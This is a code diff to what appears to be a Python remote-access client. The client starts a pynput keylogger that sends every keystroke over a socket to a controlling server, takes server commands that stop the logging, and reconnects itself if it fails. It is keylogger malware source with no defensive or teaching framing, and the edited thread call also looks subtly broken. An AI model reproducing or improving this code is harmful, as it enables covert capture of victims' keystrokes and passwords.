@@ -4,8 +4,6 @@ from time import sleep
 import random
 
 
-
-
 #######
 #TODO Implement encryption with a specified key pair. Server gets the private key and all clients get public key. Allow for a config file to be used to specify key location. Script adds the key to the user's machine.
 #TODO make cleanup script
@@ -50,7 +48,9 @@ def on_key_press(key):
         s.send(key.encode())
 
 #Keylogging Functions
-def start_keylog():
+def start_keylog(s):
+    global socket
+    socket = s
     try:
         with pynput.keyboard.Listener(on_press=on_key_press) as listener:
             global keyLoggerAlive
@@ -194,7 +194,7 @@ def clientLoop():
                 try:
                     global keyLoggerAlive
                     keyLoggerAlive = True
-                    keyLogThread = Thread(target=start_keylog)
+                    keyLogThread = Thread(target=start_keylog, args=(s))
                     keyLogThread.start()
                     if s.recv(BUFFER_SIZE).decode() == "KEY_L0GGER-END":
                         keyLoggerAlive = False
@@ -226,4 +226,10 @@ def clientLoop():
         except Exception as e:
             s.send("Error on client side.".encode())
 
-clientLoop()
+#If anything breaks, just reset the connection
+try:
+    clientLoop() 
+except KeyboardInterrupt:
+    print("\nExiting!")
+except:
+    clientLoop()
